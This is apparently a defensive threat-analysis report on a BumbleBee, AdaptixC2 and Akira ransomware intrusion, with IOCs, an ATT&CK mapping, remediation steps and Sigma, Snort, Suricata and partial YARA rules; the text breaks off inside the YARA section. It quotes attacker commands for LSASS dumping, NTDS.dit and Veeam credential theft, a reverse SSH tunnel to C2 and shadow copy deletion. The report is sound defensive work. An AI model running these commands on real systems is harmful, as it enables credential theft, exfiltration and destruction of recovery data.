# Technical Analysis Report: BumbleBee + AdaptixC2 to Akira Ransomware (2026-07-02)

Prepared by: Actioner
Classification: TLP:WHITE
Date: 2026-07-02
Version: 2.0 (FINAL)

## Executive Summary

A full intrusion chain from initial access through ransomware deployment was documented by The DFIR Report on June 29, 2026. Threat actors leveraged SEO poisoning via Bing search results to deliver trojanized MSI installers through lookalike domains. The MSI packages deployed BumbleBee loader via DLL side-loading (consent.exe + msimg32.dll), which injected AdaptixC2 shellcode into a renamed Windows Address Book binary. The operators performed extensive credential harvesting (NTDS.dit via wbadmin, Veeam credentials via psql, LSASS dumps via comsvcs.dll), created backdoor domain accounts (backup_DA, backup_EA), and exfiltrated approximately 77 GB via FileZilla SFTP. The intrusion culminated in deployment of Akira ransomware (locker.exe) with 15% partial file encryption and shadow copy deletion. Defense evasion included mixed-case command obfuscation, BYOVD with rwdrv.sys and hlpdrv.sys, and AV-killing utilities.

## Background: BumbleBee Loader and Akira Ransomware

BumbleBee is a sophisticated malware loader first observed in 2022, believed to be developed by actors affiliated with the former Conti ransomware operation. It serves as an initial access broker (IAB) tool that establishes persistent access to victim networks before handing off to ransomware operators. BumbleBee is notable for its DLL side-loading delivery mechanism, geofencing (skipping CIS region systems), and DGA-based C2 infrastructure.

Akira ransomware emerged in March 2023 and has become one of the most active ransomware families, operating a double-extortion model with data theft preceding encryption. Akira has been linked to former Conti affiliates and is known for targeting enterprise environments, particularly those with Veeam backup infrastructure. AdaptixC2 is an open-source command-and-control framework used here as the post-exploitation platform bridging BumbleBee's initial access to Akira's ransomware deployment.

## Attack Timeline (All Times UTC)

| Phase | Event |
|-------|-------|
| Initial Access | SEO poisoning via Bing search directs victim to lookalike domains (opmanager[.]pro, ip-scanner[.]org, download-center[.]online, soft-hub[.]pro) |
| Delivery | Trojanized MSI installer (ManageEngine-OpManager.msi) downloaded via gateway pattern /Get?q=<toolname> |
| Execution | MSI drops consent.exe + malicious msimg32.dll to %TEMP%\ApplicationInstallationFolder_11; DLL side-loading triggers BumbleBee |
| Loader | BumbleBee checks system locale (CIS geofencing), drops AdgNsy.exe (renamed WAB.exe), WMI spawns AdgNsy.exe |
| C2 Establishment | BumbleBee injects AdaptixC2 shellcode; beacons to 172[.]96[.]137[.]160 (HTTP) |
| Credential Harvesting | NTDS.dit via wbadmin, Veeam creds via psql, LSASS dump via comsvcs.dll |
| Persistence | Domain accounts created: backup_DA, backup_EA (P@ssw0rd1234) |
| Lateral Movement | RDP, reverse SSH tunnel, DCOM (MMC20.Application), WMI, RustDesk |
| Defense Evasion | Mixed-case obfuscation, BYOVD (rwdrv.sys, hlpdrv.sys), AV killer utilities |
| Exfiltration | ~77 GB via FileZilla SFTP to 185[.]174[.]100[.]203:22 (username "Stark"); ~2.5 GB via SSH tunnel to 193[.]242[.]184[.]150 |
| Ransomware | locker.exe staged in C:\ProgramData\, executed with -p=G:\ -n=15 (15% partial encryption) |
| Impact | Shadow copy deletion via PowerShell Get-WmiObject Win32_Shadowcopy piped to Remove-WmiObject |

## Root Cause: SEO Poisoning and Trojanized Software Installers

Initial access was achieved through SEO poisoning targeting Bing search results for popular IT management tools. The threat actors registered lookalike domains mimicking legitimate software download sites and used a consistent gateway URL pattern (/Get?q=<toolname>) to serve trojanized MSI installers. The MSI packages were signed with revoked code-signing certificates (LLC Resource+, LLC Vector), which may bypass default SmartScreen checks on some configurations. The trojanized installers contained both the legitimate consent.exe binary (a Windows UAC consent dialog component) and a malicious msimg32.dll (BumbleBee loader), enabling DLL side-loading when the legitimate binary executed.

## Technical Analysis of the Malicious Payload

### 1. BumbleBee Loader Execution Chain

The trojanized MSI installer drops its payload to `%TEMP%\ApplicationInstallationFolder_11`:

```
ManageEngine-OpManager.msi
  -> %TEMP%\ApplicationInstallationFolder_11\consent.exe (legitimate)
  -> %TEMP%\ApplicationInstallationFolder_11\msimg32.dll (BumbleBee)
```

When consent.exe loads, it side-loads the malicious msimg32.dll due to DLL search order hijacking. The BumbleBee loader performs a locale check to implement CIS-region geofencing before proceeding. It then drops AdgNsy.exe (a renamed copy of the Windows Address Book binary WAB.exe) and uses WMI to spawn it. BumbleBee then injects AdaptixC2 shellcode into the AdgNsy.exe process.

### 2. Command and Control Infrastructure

**BumbleBee C2:** Four IPs were identified for BumbleBee C2 over TLS (port 443):
- 188[.]40[.]187[.]145:443
- 109[.]205[.]195[.]211:443
- 171[.]22[.]183[.]43
- 194[.]127[.]178[.]21

**BumbleBee DGA:** The loader uses a domain generation algorithm producing 14-character .org domains:
- ev2sirbd269o5j[.]org
- 2rxyt9urhq0bgj[.]org
- d1hmxkpwby0d4s[.]org
- yj6jurm5qqkye5[.]org

**AdaptixC2:** The post-exploitation C2 framework communicated over HTTP to 172[.]96[.]137[.]160 hosted by Shock Hosting.

### 3. Credential Harvesting (Multiple Techniques)

**NTDS.dit via wbadmin:** Active Directory database extracted using Windows Backup:
```
wbadmin.exe start backup -backuptarget:\\127.0.0.1\C$\ProgramData\ -include:C:\windows\NTDS\ntds.dit,...
```

**Veeam credentials via psql:** Direct database query to extract stored Veeam Backup credentials:
```
psql.exe -U postgres -d VeeamBackup -w -c "SELECT user_name,password FROM credentials"
```

**LSASS dump via comsvcs.dll:** Memory dump of LSASS process using ordinal obfuscation:
```
rundll32.exe C:\windows\System32\comsvcs.dll, #+000024 <PID> \Windows\Temp\<random>.<ext> full
```

**Persistence accounts:** Two domain accounts created with weak passwords:
- backup_DA (Domain Admin) with P@ssw0rd1234
- backup_EA (Enterprise Admin) with P@ssw0rd1234

### 4. Lateral Movement and Persistence

- **RDP:** Used compromised domain admin credentials for lateral movement
- **Reverse SSH tunnel:** `ssh user@C2IP -R *:10400 -p22` for tunneled access
- **DCOM:** MMC20.Application COM object for remote execution
- **WMI:** Remote process creation for code execution
- **RustDesk:** Installed as a Windows service for persistent remote access

### 5. Data Exfiltration

Two exfiltration channels were used:
- **Primary:** FileZilla SFTP to 185[.]174[.]100[.]203:22 (username "Stark") -- approximately 77 GB over ~9 hours
- **Secondary:** SSH tunnel to 193[.]242[.]184[.]150 -- initial ~2.5 GB

### 6. Ransomware Deployment

Akira ransomware (locker.exe) was staged in `C:\ProgramData\` and executed with partial encryption parameters:
```
locker.exe -p=G:\ -n=15
```
The `-n=15` parameter instructs the ransomware to encrypt only 15% of each file, significantly accelerating encryption speed while rendering files unrecoverable. Shadow copies were deleted via PowerShell:
```
powershell.exe -Command "Get-WmiObject Win32_Shadowcopy | Remove-WmiObject"
```

### 7. Defense Evasion

- **Mixed-case command obfuscation:** Commands executed as `CmD.eXe`, `pOWerShELl.exE` to evade case-sensitive detection
- **BYOVD (Bring Your Own Vulnerable Driver):** rwdrv.sys deployed as `mgdsrv` service, hlpdrv.sys as `KMHLPSVC` service -- used to disable security products at kernel level
- **AV killer utilities:** Two separate AV-killing tools deployed from `av_kill_new\icardagt\icardagt.exe` and `av_kill_old\mfpmp\mfpmp.exe`
- **Secure file deletion:** Initial loaders securely deleted after execution to hinder forensic recovery

## Indicators of Compromise (IOCs)

> **Defanging Convention:** All IOCs use defanged notation: domains use `[.]` for dots, IP addresses use `[.]` for dots, URLs use `hxxps://` for scheme.

### File Hashes

| Hash (SHA256) | Filename | Description |
|---------------|----------|-------------|
| 186b26df63df3b7334043b47659cba4185c948629d857d47452cc1936f0aa5da | ManageEngine-OpManager.msi | Trojanized MSI installer |
| a6df0b49a5ef9ffd6513bfe061fb60f6d2941a440038e2de8a7aeb1914945331 | msimg32.dll | BumbleBee loader DLL |
| de730d969854c3697fd0e0803826b4222f3a14efe47e4c60ed749fff6edce19d | locker.exe | Akira ransomware executable |

### Network

| Type | Value | Context |
|------|-------|---------|
| Domain | opmanager[.]pro | Delivery domain (SEO poisoning) |
| Domain | ip-scanner[.]org | Delivery domain (SEO poisoning) |
| Domain | download-center[.]online | Delivery domain (SEO poisoning) |
| Domain | soft-hub[.]pro | Delivery domain (SEO poisoning) |
| Domain | ev2sirbd269o5j[.]org | BumbleBee DGA domain |
| Domain | 2rxyt9urhq0bgj[.]org | BumbleBee DGA domain |
| Domain | d1hmxkpwby0d4s[.]org | BumbleBee DGA domain |
| Domain | yj6jurm5qqkye5[.]org | BumbleBee DGA domain |
| IP | 188[.]40[.]187[.]145:443 | BumbleBee C2 |
| IP | 109[.]205[.]195[.]211:443 | BumbleBee C2 |
| IP | 171[.]22[.]183[.]43 | BumbleBee C2 |
| IP | 194[.]127[.]178[.]21 | BumbleBee C2 |
| IP | 172[.]96[.]137[.]160 | AdaptixC2 server (Shock Hosting) |
| IP | 185[.]174[.]100[.]203:22 | SFTP exfiltration server |
| IP | 193[.]242[.]184[.]150 | SSH tunnel exfiltration server |

### File System

| Platform | Path / Indicator | Description |
|----------|------------------|-------------|
| Windows | %TEMP%\ApplicationInstallationFolder_11\ | BumbleBee staging directory |
| Windows | %TEMP%\ApplicationInstallationFolder_11\consent.exe | Legitimate binary used for DLL side-loading |
| Windows | %TEMP%\ApplicationInstallationFolder_11\msimg32.dll | BumbleBee loader |
| Windows | AdgNsy.exe | Renamed WAB.exe used for shellcode injection |
| Windows | C:\ProgramData\locker.exe | Akira ransomware staged location |
| Windows | av_kill_new\icardagt\icardagt.exe | AV killer utility (new variant) |
| Windows | av_kill_old\mfpmp\mfpmp.exe | AV killer utility (old variant) |
| Windows | rwdrv.sys (service: mgdsrv) | BYOVD driver for security product disabling |
| Windows | hlpdrv.sys (service: KMHLPSVC) | BYOVD driver for security product disabling |

### Behavioral

- consent.exe executing from temp directories (not System32)
- msimg32.dll loaded from non-standard paths
- WMI spawning AdgNsy.exe
- psql.exe querying VeeamBackup database for credentials
- wbadmin.exe backing up NTDS.dit to ProgramData
- rundll32.exe invoking comsvcs.dll with ordinal #+000024
- Mixed-case command interpreter invocations (CmD.eXe, pOWerShELl.exE)
- Domain account creation with backup_DA/backup_EA naming
- FileZilla SFTP to external IP on port 22 with username "Stark"
- locker.exe execution with -p= and -n= parameters

## MITRE ATT&CK Mapping

| TID | Technique | Observed Behavior |
|-----|-----------|-------------------|
| T1608.006 | Stage Capabilities: SEO Poisoning | SEO poisoning via Bing search directing to lookalike domains |
| T1204.002 | User Execution: Malicious File | Victim downloads and executes trojanized MSI installer |
| T1574.001 | Hijack Execution Flow: DLL Search Order Hijacking | consent.exe side-loads malicious msimg32.dll from temp directory |
| T1055 | Process Injection | BumbleBee injects AdaptixC2 shellcode into AdgNsy.exe |
| T1047 | Windows Management Instrumentation | WMI used to spawn AdgNsy.exe and for lateral movement |
| T1003.001 | OS Credential Dumping: LSASS Memory | LSASS dump via rundll32 comsvcs.dll MiniDump |
| T1003.003 | OS Credential Dumping: NTDS | NTDS.dit extraction via wbadmin backup |
| T1555 | Credentials from Password Stores | Veeam Backup credentials extracted via psql database query |
| T1136.002 | Create Account: Domain Account | backup_DA and backup_EA domain accounts created |
| T1021.001 | Remote Services: Remote Desktop Protocol | RDP lateral movement with compromised credentials |
| T1572 | Protocol Tunneling | Reverse SSH tunnel for tunneled access (ssh -R *:10400) |
| T1543.003 | Create or Modify System Process: Windows Service | RustDesk installed as service; BYOVD drivers as services |
| T1048.001 | Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol | ~77 GB via SFTP, ~2.5 GB via SSH tunnel |
| T1486 | Data Encrypted for Impact | Akira ransomware with 15% partial file encryption |
| T1490 | Inhibit System Recovery | Shadow copy deletion via Get-WmiObject Remove-WmiObject |

## Impact Assessment

This intrusion demonstrates a mature, full-lifecycle ransomware operation spanning initial access through data destruction. The use of BumbleBee as an initial access broker feeding into AdaptixC2 for post-exploitation and ultimately Akira ransomware follows a well-established affiliate model. Several aspects elevate the operational maturity:

1. **Multi-technique credential harvesting** -- NTDS.dit, Veeam, and LSASS dumping ensures comprehensive credential coverage across the domain
2. **Dual exfiltration channels** -- SFTP and SSH tunnels provide redundancy for data theft
3. **Partial file encryption** (-n=15) -- encrypting only 15% of files dramatically accelerates impact while still rendering files unrecoverable
4. **Layered defense evasion** -- BYOVD, AV killers, mixed-case obfuscation, and secure deletion create defense-in-depth evasion

The approximately 77 GB exfiltration preceding encryption confirms the double-extortion model, where data theft provides leverage even if victims restore from backups.

## Detection & Remediation

### Immediate Detection

1. Search process creation logs for consent.exe executing from temp directories (not `C:\Windows\System32\`)
2. Search for psql.exe querying VeeamBackup database for credentials
3. Search for wbadmin.exe backup commands targeting NTDS.dit
4. Search for rundll32.exe invoking comsvcs.dll with MiniDump or ordinal #24
5. Search network logs for connections to the BumbleBee C2 IPs: 188[.]40[.]187[.]145, 109[.]205[.]195[.]211, 171[.]22[.]183[.]43, 194[.]127[.]178[.]21
6. Search for connections to AdaptixC2 at 172[.]96[.]137[.]160
7. Search for domain account creation with names containing "backup_DA" or "backup_EA"
8. Search for FileZilla SFTP connections to 185[.]174[.]100[.]203

### Remediation

1. **Containment:** Isolate affected systems; block all identified C2 and exfiltration IPs at the perimeter
2. **Account cleanup:** Disable/remove backup_DA and backup_EA accounts; rotate all domain admin and enterprise admin passwords
3. **Credential rotation:** Assume all domain credentials compromised (NTDS.dit extracted); full domain-wide password reset
4. **Veeam hardening:** Rotate Veeam service account and database credentials; restrict PostgreSQL access
5. **Driver audit:** Search for rwdrv.sys, hlpdrv.sys, mgdsrv, and KMHLPSVC services; remove BYOVD artifacts
6. **Forensic collection:** Preserve MSI installer, msimg32.dll, locker.exe, and all process creation/network logs

### Long-Term Hardening

- Implement application control to prevent execution from temp directories
- Deploy driver blocklist policies (Microsoft Vulnerable Driver Blocklist) to prevent BYOVD
- Restrict LSASS access via Credential Guard or Protected Process Light
- Monitor for Veeam database queries from non-Veeam processes
- Implement code-signing validation that checks certificate revocation status
- Restrict outbound SSH and SFTP to authorized destinations only

## Detection Rules

<!-- revision: v2.0 FINAL — applied critic verdict. Dropped: Snort DGA rule SID 2100105 (matched ANY 14-char .org DNS query, massive FP). Fixed: LSASS rule narrowed to campaign-specific #+000024 + \Windows\Temp\, confidence medium, level high. Shadow copy rule confidence medium, level high. NTDS rule confidence medium, FPs acknowledged. YARA BumbleBee: removed dead $msi_hash, tightened condition. YARA Akira: removed $shadow strings (PowerShell artifacts, not in binary), added speculative caveat. Fixed rule count 15→19. Fixed T1189→T1608.006. Added content match to Snort SID 2100103. -->

These 19 rules (6 Sigma, 4 Snort, 7 Suricata, 2 YARA) target the BumbleBee/AdaptixC2/Akira intrusion chain across host, file, and network telemetry. IOC-based network rules are high confidence but rotate with infrastructure; three TTP-layer Sigma rules (comsvcs, shadow copy, NTDS) are capped at medium confidence. Compiles does not equal fires -- verify in your pipeline.

### Sigma: BumbleBee DLL Side-Loading via consent.exe in Temp Directory

Detects consent.exe executing from a temporary directory path (not System32), the distinctive DLL side-loading technique used by BumbleBee in this campaign.

**Status:** compile ✅ compiles (convert) | Confidence: high

<!-- audit: sigma check failed (network: MITRE ATT&CK data fetch 403 via proxy -- not a rule issue). sigma convert --without-pipeline -t splunk exit 0. sigma convert --without-pipeline -t log_scale exit 0. Consent.exe outside System32 is highly distinctive; the temp path filter further narrows to this campaign's delivery mechanism. FP risk: near-zero -- consent.exe is a system binary that should never run from temp dirs. -->

```yaml
title: BumbleBee DLL Side-Loading via consent.exe and msimg32.dll in Temp Directory
id: 7a1b3c4d-5e6f-4a90-b1c2-d3e4f5a6b7c8
status: experimental
description: >
    Detects DLL side-loading technique used by BumbleBee loader where consent.exe
    is placed in a temporary directory alongside a malicious msimg32.dll. The MSI
    installer drops both files to %TEMP%\ApplicationInstallationFolder_11.
references:
    - https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/
author: Actioner
date: 2026/07/02
tags:
    - attack.t1574.001
    - attack.t1204.002
logsource:
    category: process_creation
    product: windows
detection:
    selection_consent:
        Image|endswith: '\consent.exe'
    filter_system32:
        Image|contains: '\Windows\System32\'
    selection_temp:
        Image|contains:
            - '\Temp\'
            - '\AppData\Local\Temp\'
            - 'ApplicationInstallationFolder'
    condition: selection_consent and not filter_system32 and selection_temp
falsepositives:
    - Unlikely - consent.exe should not run from temporary directories
level: high
```

### Sigma: Veeam Credential Dumping via psql Command

Detects psql.exe querying the VeeamBackup database credentials table, a technique used to harvest backup infrastructure passwords.

**Status:** compile ✅ compiles (convert) | Confidence: high

<!-- audit: sigma check failed (network). sigma convert --without-pipeline -t splunk exit 0. sigma convert --without-pipeline -t log_scale exit 0. Highly specific: psql targeting VeeamBackup + credentials table is not legitimate workflow from non-Veeam contexts. FP: legitimate Veeam DB admins querying creds table -- extremely rare in practice. -->

```yaml
title: Veeam Credential Dumping via psql Command
id: 8b2c4d5e-6f7a-4b01-c2d3-e4f5a6b7c8d9
status: experimental
description: >
    Detects the use of psql.exe to query Veeam Backup database for stored
    credentials, a technique observed in BumbleBee/Akira intrusions to harvest
    backup infrastructure passwords.
references:
    - https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/
author: Actioner
date: 2026/07/02
tags:
    - attack.t1555
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\psql.exe'
        CommandLine|contains|all:
            - 'VeeamBackup'
            - 'credentials'
    condition: selection
falsepositives:
    - Legitimate Veeam database administration querying the credentials table
level: high
```

### Sigma: LSASS Memory Dump via comsvcs.dll Ordinal 24 to Temp Directory

Detects comsvcs.dll credential dumping via the campaign-specific #+000024 ordinal with output to \Windows\Temp\. Well-known TTP narrowed to this campaign's exact invocation pattern.

**Status:** compile ✅ compiles (convert) | Confidence: medium

<!-- revision: narrowed from generic comsvcs detection (MiniDump/#24/#+000024 OR) to campaign-specific #+000024 AND \Windows\Temp\ output path. Confidence high→medium, level critical→high. Altitude violation fix: generic comsvcs.dll MiniDump abuse is covered by community Sigma rules (e.g. proc_creation_win_lolbin_rundll32_comsvcs_dump); this rule adds value only by narrowing to the campaign's exact ordinal+output combination. -->
<!-- audit: sigma convert --without-pipeline -t splunk exit 0. sigma convert --without-pipeline -t log_scale exit 0. FP: legitimate debugging via comsvcs.dll ordinal export to Windows\Temp -- near-zero in practice. -->

```yaml
title: LSASS Memory Dump via comsvcs.dll Ordinal 24 to Temp Directory
id: 9c3d5e6f-7a8b-4c12-d3e4-f5a6b7c8d9e0
status: experimental
description: >
    Detects LSASS credential dumping using rundll32.exe to invoke comsvcs.dll
    via obfuscated ordinal (#+000024) with output to Windows\Temp, consistent
    with the BumbleBee/Akira campaign's specific credential harvesting pattern.
references:
    - https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/
author: Actioner
date: 2026/07/02
tags:
    - attack.t1003.001
logsource:
    category: process_creation
    product: windows
detection:
    selection_rundll32:
        Image|endswith: '\rundll32.exe'
    selection_comsvcs:
        CommandLine|contains: 'comsvcs.dll'
    selection_ordinal:
        CommandLine|contains: '#+000024'
    selection_temp_output:
        CommandLine|contains: '\Windows\Temp\'
    condition: selection_rundll32 and selection_comsvcs and selection_ordinal and selection_temp_output
falsepositives:
    - Legitimate debugging operations using comsvcs.dll ordinal export with output to Windows\Temp
level: high
```

### Sigma: Shadow Copy Deletion via Get-WmiObject PowerShell Command

Detects shadow copy deletion using PowerShell WMI cmdlets, a TTP used by multiple ransomware families including Akira.

**Status:** compile ✅ compiles (convert) | Confidence: medium

<!-- revision: confidence high→medium, level critical→high. Altitude violation: WMI-based shadow copy deletion is used by multiple ransomware families (Akira, BlackBasta, Royal), not unique to this campaign. Rule remains valuable as the WMI variant is less commonly detected than vssadmin approaches. -->
<!-- audit: sigma convert --without-pipeline -t splunk exit 0. sigma convert --without-pipeline -t log_scale exit 0. FP: admin scripts managing shadow copies via WMI -- possible but uncommon. -->

```yaml
title: Shadow Copy Deletion via Get-WmiObject PowerShell Command
id: ad4e6f7a-8b9c-4d23-e4f5-a6b7c8d9e0f1
status: experimental
description: >
    Detects shadow copy deletion using PowerShell Get-WmiObject Win32_Shadowcopy
    piped to Remove-WmiObject, a technique used by Akira ransomware to inhibit
    system recovery before encryption.
references:
    - https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/
author: Actioner
date: 2026/07/02
tags:
    - attack.t1490
logsource:
    category: process_creation
    product: windows
detection:
    selection_ps:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
    selection_cmdline:
        CommandLine|contains|all:
            - 'Win32_Shadowcopy'
            - 'Remove-WmiObject'
    condition: selection_ps and selection_cmdline
falsepositives:
    - Legitimate administrator scripts managing shadow copies via WMI
level: high
```

### Sigma: Suspicious Backup Domain Account Creation Pattern

Detects creation of domain accounts matching the backup_DA/backup_EA naming convention used by BumbleBee/Akira operators for persistent access.

**Status:** compile ✅ compiles (convert) | Confidence: high

<!-- audit: sigma convert --without-pipeline -t splunk exit 0. sigma convert --without-pipeline -t log_scale exit 0. Highly specific account naming pattern. FP: organizations using identical naming convention for legitimate backup accounts -- unlikely but verify naming standards. -->

```yaml
title: Suspicious Backup Domain Account Creation Pattern
id: be5f7a8b-9c0d-4e34-f5a6-b7c8d9e0f1a2
status: experimental
description: >
    Detects creation of domain accounts matching the backup_DA or backup_EA naming
    pattern, consistent with BumbleBee/Akira operators creating backdoor domain
    admin and enterprise admin accounts for persistence.
references:
    - https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/
author: Actioner
date: 2026/07/02
tags:
    - attack.t1136.002
logsource:
    category: process_creation
    product: windows
detection:
    selection_net:
        Image|endswith:
            - '\net.exe'
            - '\net1.exe'
    selection_add:
        CommandLine|contains: '/add'
    selection_account:
        CommandLine|contains:
            - 'backup_DA'
            - 'backup_EA'
    condition: selection_net and selection_add and selection_account
falsepositives:
    - Unlikely - highly specific account naming pattern matching observed threat activity
level: high
```

### Sigma: NTDS.dit Credential Theft via wbadmin Backup

Detects wbadmin.exe creating a backup that includes the NTDS.dit Active Directory database for offline credential extraction. Well-known TTP; filter by scheduled backup windows and authorized service accounts to reduce FPs.

**Status:** compile ✅ compiles (convert) | Confidence: medium

<!-- revision: confidence high→medium. Altitude violation: wbadmin+ntds.dit backup is a well-documented credential theft technique (T1003.003) used across many campaigns. Legitimate AD backup operations will match -- organizations with scheduled NTDS backups via wbadmin should create environment-specific exclusions for their backup service accounts and schedule windows. -->
<!-- audit: sigma convert --without-pipeline -t splunk exit 0. sigma convert --without-pipeline -t log_scale exit 0. FP: legitimate AD backup operations that include NTDS.dit -- filter by backup schedule or service account context. -->

```yaml
title: NTDS.dit Credential Theft via wbadmin Backup
id: cf6a8b9c-0d1e-4f45-a6b7-c8d9e0f1a2b3
status: experimental
description: >
    Detects the use of wbadmin.exe to create a backup of the NTDS.dit Active
    Directory database, a credential theft technique used in BumbleBee/Akira
    intrusions to extract domain credentials offline.
references:
    - https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/
author: Actioner
date: 2026/07/02
tags:
    - attack.t1003.003
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\wbadmin.exe'
        CommandLine|contains|all:
            - 'start'
            - 'backup'
            - 'ntds.dit'
    condition: selection
falsepositives:
    - Legitimate Active Directory backup operations that include NTDS.dit -- filter by scheduled backup windows and authorized service accounts
level: high
```

### Snort: BumbleBee C2 Communication to Known Infrastructure

Four Snort rules covering BumbleBee C2 IPs. IOC-based with limited shelf life as infrastructure rotates.

**Status:** compile ✅ compiles (snort -T exit 0, 4 rules read) | Confidence: high (IOC-specific)

<!-- revision: dropped SID 2100105 (DGA domain query pattern) -- matched ANY 14-char .org DNS query via byte-level length prefix, producing massive FP volume on legitimate domains. Added TLS handshake content:|16 03| to SID 2100103 (171.22.183.43) for consistency; bumped to rev:2. SID 2100104 (194.127.178.21) retains no content match intentionally: source did not specify protocol or port for this IP, and adding an assumption would risk missing non-TLS C2 variants. -->
<!-- audit: snort -c /etc/snort/snort.conf -R <file> -T exit 0. SID range 2100101-2100104. IP rules are IOC-specific with near-zero FP. -->

```snort
alert tcp $HOME_NET any -> 188.40.187.145 443 (msg:"BUMBLEBEE C2 Communication to Known Infrastructure 188.40.187.145"; flow:established,to_server; content:"|16 03|"; depth:2; sid:2100101; rev:1; classtype:trojan-activity; reference:url,thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/;)

alert tcp $HOME_NET any -> 109.205.195.211 443 (msg:"BUMBLEBEE C2 Communication to Known Infrastructure 109.205.195.211"; flow:established,to_server; content:"|16 03|"; depth:2; sid:2100102; rev:1; classtype:trojan-activity; reference:url,thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/;)

alert tcp $HOME_NET any -> 171.22.183.43 any (msg:"BUMBLEBEE C2 Communication to Known Infrastructure 171.22.183.43"; flow:established,to_server; content:"|16 03|"; depth:2; sid:2100103; rev:2; classtype:trojan-activity; reference:url,thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/;)

alert tcp $HOME_NET any -> 194.127.178.21 any (msg:"BUMBLEBEE C2 Communication to Known Infrastructure 194.127.178.21"; flow:established,to_server; sid:2100104; rev:1; classtype:trojan-activity; reference:url,thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/;)
```

### Suricata: BumbleBee/AdaptixC2/Akira Network Indicators

Seven Suricata rules covering AdaptixC2 beacon (1 rule), BumbleBee C2 IPs (4 rules), and exfiltration destinations (2 rules).

**Status:** compile ✅ compiles (suricata -T exit 0) | Confidence: high (IOC-specific)

<!-- audit: suricata -T -S exit 0 with "Configuration provided was successfully loaded." SID range 2200001-2200007. All IOC-specific IP-based rules. FP: near-zero for IP-specific rules; shelf life limited to infrastructure rotation. -->

```suricata
alert tcp $HOME_NET any -> 172.96.137.160 any (msg:"Actioner - AdaptixC2 Beacon to Known C2 Server 172.96.137.160"; flow:established,to_server; classtype:trojan-activity; reference:url,thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/; metadata:author Actioner, created_at 2026-07-02; sid:2200001; rev:1;)

alert tcp $HOME_NET any -> 188.40.187.145 443 (msg:"Actioner - BumbleBee C2 to Known Infrastructure 188.40.187.145"; flow:established,to_server; classtype:trojan-activity; reference:url,thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/; metadata:author Actioner, created_at 2026-07-02; sid:2200002; rev:1;)

alert tcp $HOME_NET any -> 109.205.195.211 443 (msg:"Actioner - BumbleBee C2 to Known Infrastructure 109.205.195.211"; flow:established,to_server; classtype:trojan-activity; reference:url,thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/; metadata:author Actioner, created_at 2026-07-02; sid:2200003; rev:1;)

alert tcp $HOME_NET any -> 171.22.183.43 any (msg:"Actioner - BumbleBee C2 to Known Infrastructure 171.22.183.43"; flow:established,to_server; classtype:trojan-activity; reference:url,thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/; metadata:author Actioner, created_at 2026-07-02; sid:2200004; rev:1;)

alert tcp $HOME_NET any -> 194.127.178.21 any (msg:"Actioner - BumbleBee C2 to Known Infrastructure 194.127.178.21"; flow:established,to_server; classtype:trojan-activity; reference:url,thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/; metadata:author Actioner, created_at 2026-07-02; sid:2200005; rev:1;)

alert tcp $HOME_NET any -> 185.174.100.203 22 (msg:"Actioner - Akira Data Exfiltration to Known SFTP Server 185.174.100.203"; flow:established,to_server; classtype:trojan-activity; reference:url,thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/; metadata:author Actioner, created_at 2026-07-02; sid:2200006; rev:1;)

alert tcp $HOME_NET any -> 193.242.184.150 any (msg:"Actioner - BumbleBee/Akira SSH Tunnel Exfil to 193.242.184.150"; flow:established,to_server; classtype:trojan-activity; reference:url,thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/; metadata:author Actioner, created_at 2026-07-02; sid:2200007; rev:1;)
```

### YARA: BumbleBee Loader and Akira Ransomware File Detection

Two YARA rules targeting the BumbleBee loader DLL (msimg32.dll with side-loading artifacts) and Akira ransomware executable (locker.exe). Without access to the actual malware samples, these rules key on documented strings and known hashes.

**Status:** compile ✅ compiles (yarac exit 0) | Confidence: medium (string-based without sample verification)

<!-- revision: BumbleBee rule: removed $msi_hash (dead code -- SHA256 hash bytes of the MSI would not appear inside the DLL they describe). Tightened condition: now requires at least one campaign-specific string ($folder or $wab) AND at least one DLL-context string ($dll_name or $side_load), preventing 2-of-4 combinations that lack campaign specificity. Akira rule: removed $shadow1/$shadow2 (Win32_Shadowcopy and Remove-WmiObject are PowerShell command-line strings executed separately, not embedded in the locker.exe binary). Simplified to single branch requiring both CLI params and Akira-specific string. Added speculative caveat in meta: rule built from documented behavioral artifacts without access to the actual sample. -->
<!-- audit: yarac exit 0. No sample available for fire test -- confidence capped at medium. -->

```yara
rule BumbleBee_Loader_msimg32
{
    meta:
        description = "Detects BumbleBee loader delivered as msimg32.dll via DLL side-loading with consent.exe in trojanized MSI installers"
        author = "Actioner"
        date = "2026-07-02"
        reference = "https://thedfirreport.com/2026/06/29/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira-3/"
